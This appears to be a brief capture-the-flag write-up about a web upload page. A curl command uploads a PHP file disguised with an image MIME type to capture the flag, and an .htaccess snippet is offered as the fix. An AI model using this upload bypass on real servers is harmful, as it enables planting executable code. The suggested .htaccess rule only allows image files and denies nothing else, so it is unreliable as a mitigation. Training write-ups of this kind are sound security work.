# How I found it

we upload a file in this page by
`curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@test.php;type=image/jpeg' http://{IP}/?page=upload`
and we get the flag

### Solution

To solve this problem we can add htacces to folder where we save this picture or by checking with get_image_size ..etc

```
<FilesMatch "\.(gif|jpe?g|png)$">
Order allow,deny
Allow from all
</FilesMatch>
```
